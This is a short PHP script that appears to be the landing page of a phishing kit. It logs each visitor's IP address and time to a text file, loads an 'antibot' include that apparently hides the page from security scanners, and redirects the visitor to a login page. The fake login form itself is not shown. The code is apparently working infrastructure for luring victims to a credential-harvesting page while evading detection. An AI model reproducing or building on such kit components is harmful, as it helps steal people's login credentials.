<?php
   ob_start();
    session_start();

function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){$ip=$_SERVER['HTTP_CLIENT_IP'];}
 elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}
 else{$ip=$_SERVER['REMOTE_ADDR'];}
 return $ip;
}

$myfile = fopen("Views.txt", "a+");
fwrite($myfile, getRealIpAddr()."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
fclose($myfile);
require_once 'antibot.php';
	$praga=rand();
	$praga=md5($praga);
	die(header("location: login.php"));
?>